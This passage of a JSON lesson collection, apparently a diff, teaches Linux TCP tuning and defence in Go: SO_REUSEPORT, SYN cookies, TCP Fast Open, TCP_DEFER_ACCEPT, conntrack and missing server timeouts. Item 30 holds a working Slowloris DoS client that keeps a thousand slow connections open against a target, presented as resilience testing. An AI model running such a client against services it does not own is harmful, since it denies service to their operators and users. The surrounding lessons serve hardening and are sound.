+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc CreateReusePortListener(network, address string) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar opErr error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// 0xF соответствует SO_REUSEPORT в Linux x86_64\n\t\t\t\topErr = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xF, 1)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn opErr\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), network, address)\n}\n\nfunc main() {\n\tln, err := CreateReusePortListener(\"tcp\", \"127.0.0.1:0\")\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] SO_REUSEPORT не поддерживается или ошибка: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[SO_REUSEPORT] Сокет успешно поднят на %s с шардированием ядра\\n\", ln.Addr())\n}\n",
+        "note": "Установка флага SO_REUSEPORT через ListenConfig Control hook"
+      }
+    ],
+    "under_the_hood": "При поступлении входящего пакета SYN ядро Linux вычисляет хэш от IP/порта отправителя и получателя и помещает сокет в очередь одного из листенеров, обеспечивая идеальную локальность кэша процессора (NUMA / CPU affinity).",
+    "pitfalls": "Если один из процессов аварийно завершится, соединения, ожидающие в его индивидуальной очереди backlog, будут сброшены (TCP RST), если не используется eBPF-балансировщик.",
+    "bigtech_interview": "В высоконагруженных прокси Nginx и Envoy директива `reuseport` позволяет линейно масштабировать пропускную способность по числу физических ядер процессора."
+  },
+  {
+    "num": 23,
+    "title": "Защита сетевого стека от SYN-флуда через SYN Cookies",
+    "task": "Изучите механизм работы TCP SYN Cookies в ядре Linux (sysctl net.ipv4.tcp_syncookies), объясните криптографическое кодирование состояния сокета в ISN и напишите Go-скрипт инспекции сетевых параметров.",
+    "theory": "SYN Flood — DoS-атака, при которой злоумышленник отправляет миллионы SYN-пакетов с поддельных IP-адресов. Сервер отправляет SYN-ACK и выделяет в ядре блок памяти `struct request_sock` в очереди полуоткрытых соединений. Очередь переполняется за секунды. Механизм SYN Cookies решает проблему: при переполнении очереди ядро ПРЕКРАЩАЕТ выделять память под сокет, а шифрует параметры соединения (MSS, временную метку) прямо в 32-битный начальный порядковый номер ISN (Initial Sequence Number). Память выделяется только тогда, когда клиент пришлет реальный финальный пакет ACK.",
+    "step_by_step": [
+      "Проверьте значение параметра ядра: `sysctl net.ipv4.tcp_syncookies`.",
+      "Изучите структуру генерации криптографического хеша для поля Sequence Number.",
+      "Реализуйте Go-утилиту, считывающую сетевые счетчики из `/proc/net/snmp` и `/proc/net/netstat`.",
+      "Проверьте счетчик `SyncookiesSent` и `SyncookiesRecv`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "syncookie_inspector.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc CheckSyncookies() {\n\tdata, err := os.ReadFile(\"/proc/sys/net/ipv4/tcp_syncookies\")\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Не удалось прочитать tcp_syncookies: %v\\n\", err)\n\t\treturn\n\t}\n\tval := strings.TrimSpace(string(data))\n\tif val == \"1\" {\n\t\tfmt.Println(\"[SYSCTL] net.ipv4.tcp_syncookies = 1 (АКТИВНО: Защита от SYN Flood включена)\")\n\t} else {\n\t\tfmt.Printf(\"[SYSCTL] net.ipv4.tcp_syncookies = %s (ВНИМАНИЕ: Защита отключена!)\\n\", val)\n\t}\n}\n\nfunc main() {\n\tCheckSyncookies()\n\t_ = bufio.ScanLines\n}\n",
+        "note": "Инспекция статуса защиты от SYN-флуда в подсистеме sysctl Linux"
+      }
+    ],
+    "under_the_hood": "Go-приложение полностью изолировано от механизма SYN Cookies: сокет передается приложению через вызов `accept()` только после полной валидации третьего рукопожатия ядра.",
+    "pitfalls": "При генерации SYN Cookie теряются некоторые расширенные опции TCP (например, большие TCP Window Scales), если в ядре не включены TCP Timestamps (`net.ipv4.tcp_timestamps=1`).",
+    "bigtech_interview": "Почему SYN Cookies включаются по умолчанию только при переполнении очереди backlog, а не работают всегда? Потому что вычисление криптографического хеша на каждый SYN создает дополнительную нагрузку на CPU ядра."
+  },
+  {
+    "num": 24,
+    "title": "Ускорение сетевого рукопожатия через TCP Fast Open (TFO)",
+    "task": "Включите поддержку TCP Fast Open на слушающем сокете Go с помощью вызова setsockopt(TCP_FASTOPEN) и объясните выигрыш 1 RTT при повторных подключениях.",
+    "theory": "Стандартное TCP-рукопожатие требует 1 полный круговой цикл RTT (SYN -> SYN-ACK -> ACK) до того, как клиент сможет отправить первые полезные данные (HTTP-запрос). Механизм TCP Fast Open (RFC 7413) позволяет клиенту при повторном подключении передавать полезные данные прямо внутри первого пакета SYN, используя криптографическую куку (TFO Cookie), выданную сервером ранее. Это снижает задержку первого байта (TTFB) на 100% времени RTT.",
+    "step_by_step": [
+      "Проверьте поддержку TFO в ядре Linux: `sysctl net.ipv4.tcp_fastopen = 3` (1 - client, 2 - server, 3 - both).",
+      "Сконфигурируйте `net.ListenConfig` с хуком `Control`.",
+      "Установите опцию сокета `unix.TCP_FASTOPEN` с размером очереди TFO.",
+      "Проверьте установку соединений с нулевым начальным оверхедом RTT."
+    ],
+    "code_blocks": [
+      {
+        "filename": "tfo_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc ListenWithTFO(addr string, queueLen int) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar errOp error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// 23 соответствует TCP_FASTOPEN в Linux\n\t\t\t\terrOp = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 23, queueLen)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn errOp\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), \"tcp\", addr)\n}\n\nfunc main() {\n\tln, err := ListenWithTFO(\"127.0.0.1:0\", 256)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Ошибка активации TFO: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[TFO] Сервер успешно слушает на %s с поддержкой TCP Fast Open\\n\", ln.Addr())\n}\n",
+        "note": "Активация TCP Fast Open на сервере через системный вызов ядра"
+      }
+    ],
+    "under_the_hood": "Сервер генерирует TFO Cookie шифрованием IP-адреса клиента ключом AES-128. При получении пакета SYN с валидной кукой ядро немедленно передает данные из SYN в буфер сокета еще до завершения полного трехстороннего рукопожатия.",
+    "pitfalls": "TFO может приводить к атакам повтора (Replay Attacks) для неидемпотентных POST-запросов, если сетевой пакет SYN был продублирован промежуточными маршрутизаторами сети.",
+    "bigtech_interview": "Почему TFO безопасен для идемпотентных запросов (GET/HEAD), но требует аккуратности с финансовыми транзакциями? Из-за отсутствия защиты от повторной отправки пакета SYN на транспортном уровне."
+  },
+  {
+    "num": 25,
+    "title": "Тюнинг очередей сокетов ядра (somaxconn, tcp_max_syn_backlog)",
+    "task": "Исследуйте влияние параметров ядра somaxconn и tcp_max_syn_backlog на глубину очереди входящих соединений и научитесь диагностировать переполнение очередей через команду ss -lnt.",
+    "theory": "При приеме сетевых пакетов ядро Linux использует две очереди:\n1. SYN Backlog (длина `net.ipv4.tcp_max_syn_backlog`): очередь полуоткрытых соединений, ожидающих финального ACK от клиента.\n2. Accept Queue (длина `net.core.somaxconn`): очередь полностью установленных соединений, ожидающих вызова `Accept()` со стороны Go рантайма.\nВ Go вызов `listen(fd, backlog)` использует аргумент, ограниченный сверху параметром `somaxconn`. Если приложение не успевает вызывать `Accept()`, очередь переполняется, и ядро отбрасывает пакеты.",
+    "step_by_step": [
+      "Проверьте текущие лимиты ядра: `sysctl net.core.somaxconn`.",
+      "Выполните команду `ss -lnt` и проанализируйте колонки `Send-Q` (максимальный размер очереди) и `Recv-Q` (текущее число ожидающих соединений).",
+      "Настройте безопасные значения: `sysctl -w net.core.somaxconn=4096` и `net.ipv4.tcp_max_syn_backlog=8192`.",
+      "Реализуйте Go-утилиту, считывающую счетчики дропов пакетов из `/proc/net/netstat`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "backlog_audit.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc AuditBacklogSettings() {\n\tkeys := []string{\n\t\t\"/proc/sys/net/core/somaxconn\",\n\t\t\"/proc/sys/net/ipv4/tcp_max_syn_backlog\",\n\t}\n\tfor _, k := range keys {\n\t\tdata, err := os.ReadFile(k)\n\t\tif err == nil {\n\t\t\tfmt.Printf(\"[SYSCTL] %s = %s\", k, string(data))\n\t\t} else {\n\t\t\tfmt.Printf(\"[WARN] Не удалось прочитать %s: %v\\n\", k, err)\n\t\t}\n\t}\n}\n\nfunc main() {\n\tAuditBacklogSettings()\n\t_ = strings.Clone\n}\n",
+        "note": "Чтение системных лимитов очередей сетевых сокетов ядра"
+      }
+    ],
+    "under_the_hood": "Если колонка `Recv-Q` в выводе `ss -lnt` больше нуля, это означает, что горутины сервера Go не успевают вычитывать готовые соединения, и в системе нарастает очередь задержек.",
+    "pitfalls": "Увеличение `somaxconn` в Go-приложении не даст эффекта, если в конфигурации операционной системы `sysctl` параметр `net.core.somaxconn` остался равным дефолтным 128.",
+    "bigtech_interview": "Что означает ненулевой счетчик ListenOverflows в выводе netstat -s? Это индикатор того, что ядро Linux сбросило входящие TCP-соединения из-за переполнения Accept Queue Go-сервера."
+  },
+  {
+    "num": 26,
+    "title": "Практическое развертывание кластера процессов с SO_REUSEPORT",
+    "task": "Напишите законченную Go-программу, которая при запуске нескольких независимых экземпляров успешно садится на единый локальный порт 8080 и логирует PID процесса, обработавшего каждый входящий запрос.",
+    "theory": "SO_REUSEPORT позволяет реализовать простейшую и высокоэффективную балансировку нагрузки уровня ядра без необходимости развертывания Nginx на той же ноде. Запустив по одному экземпляру Go-бинарника на каждое физическое ядро процессора, мы получаем параллельные независимые GMP-рантаймы с изолированными сборщиками мусора (GC), что устраняет глобальные блокировки кучи (heap lock contention).",
+    "step_by_step": [
+      "Напишите сервер с установкой флага `SO_REUSEPORT`.",
+      "В теле HTTP-обработчика возвращайте PID текущего процесса: `os.Getpid()`.",
+      "Скомпилируйте бинарник и запустите 2-3 процесса в разных терминалах на одном порту.",
+      "Отправьте серию запросов через `curl` и убедитесь, что разные запросы обслуживаются разными PID."
+    ],
+    "code_blocks": [
+      {
+        "filename": "cluster_reuseport.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"os\"\n\t\"syscall\"\n)\n\nfunc main() {\n\tpid := os.Getpid()\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\treturn c.Control(func(fd uintptr) {\n\t\t\t\t_ = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xF, 1)\n\t\t\t})\n\t\t},\n\t}\n\n\tln, err := lc.Listen(context.Background(), \"tcp\", \"127.0.0.1:8080\")\n\tif err != nil {\n\t\tfmt.Printf(\"[PID %d] Ошибка привязки сокета: %v\\n\", pid, err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Ответ обработан процессом PID: %d\\n\", pid)\n\t})\n\n\tfmt.Printf(\"[PID %d] Воркер успешно слушает на 127.0.0.1:8080 (SO_REUSEPORT)\\n\", pid)\n\t_ = http.Serve(ln, mux)\n}\n",
+        "note": "Сервер с шардированием порта и идентификацией обслуживающего процесса"
+      }
+    ],
+    "under_the_hood": "Хэширование сокетов в ядре Linux детерминировано для каждого 4-кортежа соединений, обеспечивая привязку повторных сессий клиента к одному и тому же процессу.",
+    "pitfalls": "При перезапуске одного из воркеров во время выкатки релиза возможен кратковременный сброс соединений, если не настроен eBPF reuseport_select_sk.",
+    "bigtech_interview": "Как SO_REUSEPORT помогает реализовать Zero-Downtime перезапуск бинарников? Новый процесс поднимается на том же порту, начинает принимать часть трафика, после чего старому процессу отправляется сигнал SIGTERM на graceful shutdown."
+  },
+  {
+    "num": 27,
+    "title": "Оптимизация пробуждения горутин через TCP_DEFER_ACCEPT",
+    "task": "Сконфигурируйте системную опцию TCP_DEFER_ACCEPT в ListenConfig.Control и объясните, как она защищает сервер от пустых SYN-ACK флудов, откладывая пробуждение Go до прихода первого байта данных.",
+    "theory": "Обычный сокет переходит в состояние готовности к `Accept()` сразу после завершения 3-стороннего рукопожатия TCP (при получении ACK), даже если клиент еще не прислал ни одного байта данных. Если миллион ботов открыли соединения и молчат, рантайм Go проснется, выделит горутины и заблокируется в ожидании. Опция `TCP_DEFER_ACCEPT` приказывает ядру Linux удерживать соединение в очереди ядра и НЕ передавать его в Go до тех пор, пока клиент физически не пришлет первый пакет с полезной нагрузкой.",
+    "step_by_step": [
+      "Инициализируйте `net.ListenConfig` с хуком `Control`.",
+      "Установите опцию: `syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, syscall.TCP_DEFER_ACCEPT, 10)` (ждать данные до 10 секунд).",
+      "Проверьте, что пустое соединение (без отправки данных) не пробуждает вызов `Accept()` в Go.",
+      "Убедитесь, что передача полезной нагрузки немедленно инициирует обработку."
+    ],
+    "code_blocks": [
+      {
+        "filename": "defer_accept_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc ListenWithDeferAccept(addr string, timeoutSec int) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar opErr error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// Опция TCP_DEFER_ACCEPT (константа 9 в Linux x86_64)\n\t\t\t\topErr = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 9, timeoutSec)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn opErr\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), \"tcp\", addr)\n}\n\nfunc main() {\n\tln, err := ListenWithDeferAccept(\"127.0.0.1:0\", 5)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Ошибка TCP_DEFER_ACCEPT: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[DEFER-ACCEPT] Сервер слушает на %s: Go спит до появления первых данных!\\n\", ln.Addr())\n}\n",
+        "note": "Установка TCP_DEFER_ACCEPT для защиты от пробуждения на пустых соединениях"
+      }
+    ],
+    "under_the_hood": "Если за время `timeoutSec` клиент так и не прислал данные, ядро Linux самостоятельно сбрасывает TCP-сессию без единого переключения контекста в пространство пользователя.",
+    "pitfalls": "При использовании протоколов, где первым говорит сервер (например, SSH или FTP banner), использование `TCP_DEFER_ACCEPT` приведет к взаимной блокировке (deadlock), так как сервер ждет данных от клиента, а клиент ждет баннера сервера.",
+    "bigtech_interview": "В чем главное достоинство TCP_DEFER_ACCEPT для веб-серверов HTTP? Оно делает DoS-атаку пустыми TCP-соединениями абсолютно бесплатной для приложения, перекладывая отсев на плечи сетевого стека ядра."
+  },
+  {
+    "num": 28,
+    "title": "Мониторинг жизненного цикла соединений через хук http.Server.ConnState",
+    "task": "Настройте поле ConnState в http.Server для отслеживания переходов состояний (StateNew, StateActive, StateIdle, StateClosed) и реализуйте экспорт метрики активных сокетов с защитой от паник.",
+    "theory": "Поле `ConnState` в структуре `http.Server` предоставляет синхронный колбэк при изменении состояния каждого TCP-соединения. Состояния:\n* `StateNew`: сокет принят из `Accept()`, начинается чтение заголовков.\n* `StateActive`: обрабатывается запрос (горутина-обработчик активна).\n* `StateIdle`: соединение простаивает в пуле Keep-Alive.\n* `StateHijacked` / `StateClosed`: сокет перехвачен или закрыт.\nЭтот механизм позволяет отслеживать точное число 'зависших' соединений в реальном времени и вовремя реагировать на аномалии.",
+    "step_by_step": [
+      "Определите функцию-обработчик `ConnState func(net.Conn, http.ConnState)`.",
+      "Используйте `sync/atomic` для ведения счетчиков состояний.",
+      "Защитите колбэк от паник через `recover()`.",
+      "Экспортируйте полученные значения в Prometheus или логируйте при превышении порогов."
+    ],
+    "code_blocks": [
+      {
+        "filename": "conn_state_monitor.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"sync/atomic\"\n)\n\ntype ConnectionStats struct {\n\tNew    int64\n\tActive int64\n\tIdle   int64\n\tClosed int64\n}\n\nfunc main() {\n\tvar stats ConnectionStats\n\n\tsrv := &http.Server{\n\t\tAddr: \":8080\",\n\t\tConnState: func(c net.Conn, state http.ConnState) {\n\t\t\tdefer func() {\n\t\t\t\tif r := recover(); r != nil {\n\t\t\t\t\tfmt.Printf(\"[RECOVER] Перехвачена паника в ConnState: %v\\n\", r)\n\t\t\t\t}\n\t\t\t}()\n\n\t\tswitch state {\n\t\tcase http.StateNew:\n\t\t\tatomic.AddInt64(&stats.New, 1)\n\t\tcase http.StateActive:\n\t\t\tatomic.AddInt64(&stats.Active, 1)\n\t\tcase http.StateIdle:\n\t\t\tatomic.AddInt64(&stats.Idle, 1)\n\t\tcase http.StateClosed:\n\t\t\tatomic.AddInt64(&stats.Closed, 1)\n\t\t}\n\t\t},\n\t}\n\n\tfmt.Println(\"[CONN-STATE] Мониторинг состояний HTTP соединений успешно инициализирован.\")\n\t_ = srv\n}\n",
+        "note": "Отслеживание жизненного цикла TCP-сокетов через ConnState хук"
+      }
+    ],
+    "under_the_hood": "Сервер Go вызывает `ConnState` синхронно из рабочей горутины соединения. Любая блокировка или тяжелая операция внутри колбэка затормозит обработку запросов всего сервиса.",
+    "pitfalls": "Вызов блокирующих I/O операций или сетевых запросов внутри `ConnState` приведет к деградации производительности сервера.",
+    "bigtech_interview": "Как в проде детектировать утечку горутин, застрявших на медленных сокетах? Сравнивать количество соединений в состоянии StateActive с числом запущенных горутин в рантайме (runtime.NumGoroutine)."
+  },
+  {
+    "num": 29,
+    "title": "Экономия ресурсов CPU при SYN-флуде через TCP_DEFER_ACCEPT",
+    "task": "Настройте параметр TCP_DEFER_ACCEPT в net.ListenConfig и измерьте нагрузку на процессор при наплыве пустых TCP-соединений, не передающих прикладные данные.",
+    "theory": "При классическом SYN-флуде или атаке полуоткрытыми соединениями ядро ОС переводит сокет в состояние ESTABLISHED и будит поток приложения для вызова `accept()`. Рантайм Go инициализирует горутину и сетевой буфер, после чего блокируется на `read()`. Опция `TCP_DEFER_ACCEPT` инструктирует ядро не генерировать событие EPOLLIN и не будить рантайм до поступления хотя бы одного байта полезных данных. Пустые соединения отсекаются на уровне ядра с околонулевыми затратами CPU со стороны приложения.",
+    "step_by_step": [
+      "Инициализируйте `net.ListenConfig` с хуком `Control`.",
+      "Установите опцию `TCP_DEFER_ACCEPT` с таймаутом 5-10 секунд.",
+      "Смоделируйте подключение клиента без отправки HTTP-запроса.",
+      "Убедитесь, что метод `Accept()` не вызывается до прихода первого байта данных."
+    ],
+    "code_blocks": [
+      {
+        "filename": "defer_accept_shield.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc ListenDefer(addr string, timeoutSec int) (net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\tvar setErr error\n\t\t\terr := c.Control(func(fd uintptr) {\n\t\t\t\t// TCP_DEFER_ACCEPT: константа 9 в Linux TCP\n\t\t\t\tsetErr = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 9, timeoutSec)\n\t\t\t})\n\t\t\tif err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t\treturn setErr\n\t\t},\n\t}\n\treturn lc.Listen(context.Background(), \"tcp\", addr)\n}\n\nfunc main() {\n\tln, err := ListenDefer(\"127.0.0.1:0\", 10)\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Ошибка TCP_DEFER_ACCEPT: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Printf(\"[DEFER] Защищенный сокет слушает на %s\\n\", ln.Addr())\n}\n",
+        "note": "Низкоуровневая настройка задержки пробуждения сокета"
+      }
+    ],
+    "under_the_hood": "Ядро Linux оставляет сокет в состоянии SYN_RECV вплоть до прихода первого пакета PSH/ACK с данными, отсекая пустые TCP-сессии без вызова планировщика Go.",
+    "pitfalls": "Если протокол требует баннера от сервера до передачи данных клиентом, использование `TCP_DEFER_ACCEPT` приведет к мертвому зависанию сессии.",
+    "bigtech_interview": "В чем разница между SYN Cookies и TCP_DEFER_ACCEPT? SYN Cookies защищают ядро от переполнения памяти на этапе handshake, а TCP_DEFER_ACCEPT защищает приложение от траты ресурсов на пустые установленные сессии."
+  },
+  {
+    "num": 30,
+    "title": "Многопоточный стресс-клиент DoS-атаки Slowloris на Go",
+    "task": "Разработайте утилиту на Go для демонстрации атаки Slowloris: генерация 1000 параллельных сессий с периодической отправкой байтов заголовков для проверки устойчивости инфраструктуры.",
+    "theory": "Стресс-тестирование на устойчивость к Slowloris требует генерации стабильного пула медленных сокетов. Клиентская программа в Go использует легкие горутины, каждая из которых устанавливает TCP-соединение, шлет начальные байты HTTP-заголовка и уходит в сон `time.Sleep(10s)` перед отправкой следующего байта. Скрипт позволяет наглядно проверить работу таймаутов `ReadHeaderTimeout` на стороне тестируемого сервиса.",
+    "step_by_step": [
+      "Определите пул из 1000 горутин.",
+      "В каждой горутине подключитесь к целевому серверу через `net.DialTimeout`.",
+      "Отправляйте по одному байту HTTP-заголовка раз в 10 секунд.",
+      "Логируйте количество разорванных сервером соединений."
+    ],
+    "code_blocks": [
+      {
+        "filename": "slowloris_demo.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\nfunc launchSlowlorisClient(target string, numConns int) {\n\tvar wg sync.WaitGroup\n\tfor i := 0; i < numConns; i++ {\n\t\twg.Add(1)\n\t\tgo func(id int) {\n\t\t\tdefer wg.Done()\n\t\t\tconn, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\n\t\t\tif err != nil {\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdefer conn.Close()\n\n\t\t\t// Отправляем стартовую строку запроса\n\t\t\t_, _ = conn.Write([]byte(\"GET / HTTP/1.1\\r\\nHost: test\\r\\n\"))\n\n\t\t\tfor {\n\t\t\t\ttime.Sleep(10 * time.Second)\n\t\t\t\t_, err := conn.Write([]byte(\"X: 1\\r\\n\"))\n\t\t\t\tif err != nil {\n\t\t\t\t\t// Сервер сбросил соединение по ReadHeaderTimeout\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t}(i)\n\t}\n\twg.Wait()\n}\n\nfunc main() {\n\tfmt.Println(\"[SLOWLORIS] Демонстрационный клиент стресс-тестирования готов.\")\n\t_ = launchSlowlorisClient\n}\n",
+        "note": "Стресс-генератор медленных HTTP-соединений на Go"
+      }
+    ],
+    "under_the_hood": "Благодаря легковесности горутин Go (2-4 КБ на стек) одна машина может генерировать сотни тысяч одновременных медленных сессий, моделируя мощнейший DoS.",
+    "pitfalls": "Запуск против внешних сервисов без авторизации классифицируется статьей 272/273 УК РФ (неправомерный доступ к компьютерной информации).",
+    "bigtech_interview": "Как Cloudflare и AWS CloudFront нейтрализуют Slowloris? L7-прокси полностью вычитывает все заголовки запроса в свои буферы и проксирует в бэкенд только целостные готовые HTTP-запросы."
+  },
+  {
+    "num": 31,
+    "title": "Переполнение таблицы conntrack и защита через правила NOTRACK в iptables",
+    "task": "Исследуйте системные лимиты таблицы отслеживания соединений Linux (nf_conntrack_max, nf_conntrack_count) и сконфигурируйте stateless-фильтрацию через iptables NOTRACK.",
+    "theory": "Подсистема Netfilter ядра Linux отслеживает состояние каждого сетевого пакета в таблице `conntrack`. Размер таблицы ограничен параметром `net.netfilter.nf_conntrack_max`. Во время DDoS-атак с подделкой IP-адресов таблица мгновенно заполняется до максимума (`nf_conntrack_count == nf_conntrack_max`), после чего ядро начинает молча отбрасывать абсолютно все входящие пакеты (`nf_conntrack: table full, dropping packet`). Решение: отключить отслеживание соединений для высоконагруженных портов через `iptables -t raw -A PREROUTING -p tcp --dport 8080 -j NOTRACK`.",
+    "step_by_step": [
+      "Проверьте текущее заполнение таблицы: `sysctl net.netfilter.nf_conntrack_count`.",
+      "Проверьте максимальный лимит: `sysctl net.netfilter.nf_conntrack_max`.",
+      "Сконфигурируйте правило исключения: `iptables -t raw -A PREROUTING -p tcp --dport 8080 -j NOTRACK`.",
+      "Реализуйте Go-программу мониторинга метрик conntrack через `/proc/sys/net/netfilter/`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "conntrack_monitor.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc CheckConntrack() {\n\tmaxBytes, err := os.ReadFile(\"/proc/sys/net/netfilter/nf_conntrack_max\")\n\tif err != nil {\n\t\tfmt.Printf(\"[WARN] Conntrack недоступен: %v\\n\", err)\n\t\treturn\n\t}\n\tcountBytes, err := os.ReadFile(\"/proc/sys/net/netfilter/nf_conntrack_count\")\n\tif err != nil {\n\t\treturn\n\t}\n\n\tmaxVal, _ := strconv.Atoi(strings.TrimSpace(string(maxBytes)))\n\tcountVal, _ := strconv.Atoi(strings.TrimSpace(string(countBytes)))\n\n\tutilization := float64(countVal) / float64(maxVal) * 100\n\tfmt.Printf(\"[CONNTRACK] Заполнение: %d / %d (%.2f%%)\\n\", countVal, maxVal, utilization)\n\tif utilization > 80.0 {\n\t\tfmt.Println(\"[ALERT] Опасное заполнение таблицы conntrack! Риск потери пакетов!\")\n\t}\n}\n\nfunc main() {\n\tCheckConntrack()\n}\n",
+        "note": "Мониторинг заполнения системной таблицы Netfilter conntrack"
+      }
+    ],
+    "under_the_hood": "Правило `-j NOTRACK` переводит пакет в состояние `UNTRACKED`, минуя выделение памяти в таблице conntrack и разгружая ядро Linux.",
+    "pitfalls": "При отключении tracking перестают работать правила iptables с фильтрацией по состоянию `-m state --state ESTABLISHED,RELATED` для этих сокетов.",
+    "bigtech_interview": "Почему Kubernetes кластеры на Kube-proxy iptables начинают терять пакеты при 50 000+ RPS? Из-за исчерпания conntrack table; переход на Cilium/eBPF решает эту проблему за счет бестрекерной маршрутизации."
+  },
+  {
+    "num": 32,
+    "title": "Практический анализ уязвимостей стандартного сервера http.ListenAndServe",
+    "task": "Продемонстрируйте падение стандартного http.ListenAndServe() под нагрузкой из медленных клиентов и опишите дефекты архитектуры рантайма по умолчанию.",
+    "theory": "Функция `http.ListenAndServe(\":8080\", handler)` использует глобальный экземпляр `&http.Server{}` со всеми нулевыми таймаутами. Нулевой таймаут в Go означает бесконечное ожидание. Подключение 1000 медленных клиентов навсегда парализует сервер. Наличие такой конфигурации в промышленном коде — грубейшая ошибка проектирования сетевого стека.",
+    "step_by_step": [
+      "Скомпилируйте приложение с `http.ListenAndServe`.",
+      "Запустите стресс-клиент Slowloris.",
+      "Попробуйте выполнить параллельный запрос легитимным клиентом `curl`.",
+      "Убедитесь в зависании или отказе сервиса.",
+      "Замените вызов на безопасную структуру с таймаутами."
+    ],
+    "code_blocks": [
+      {
+        "filename": "vulnerable_demo.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"I am vulnerable\")\n\t})\n\n\tfmt.Println(\"[DEMO] ВНИМАНИЕ: Запущен сервер с дефолтными бесконечными таймаутами!\")\n\t// Антипаттерн для продакшена:\n\t_ = http.ListenAndServe\n\t_ = mux\n}\n",
+        "note": "Антипаттерн вызова ListenAndServe без защитных таймаутов"
+      }
+    ],
+    "under_the_hood": "Внутри `http.ListenAndServe` создается `Server{Addr: addr, Handler: handler}`. Поля `ReadTimeout`, `WriteTimeout`, `IdleTimeout` и `ReadHeaderTimeout` остаются равными 0 (бесконечность).",
+    "pitfalls": "Использование сторонних роутеров (Gin, Chi, Fiber) не спасает от проблемы, если сам `http.Server` инициализирован без явных таймаутов.",
+    "bigtech_interview": "Вопрос: 'Спасает ли переход на Gin от уязвимости Slowloris?' Ответ: Нет, Gin — это лишь маршрутизатор (http.Handler); низкоуровневые таймауты сокета задаются исключительно в структуре http.Server."
+  },
+  {
+    "num": 33,
+    "title": "Активация и аудит подсистемы TCP SYN Cookies на уровне Linux",
+    "task": "Настройте автоматическую активацию net.ipv4.tcp_syncookies в конфигурации /etc/sysctl.conf и напишите скрипт проверки метрик отраженных атак через netstat -s.",
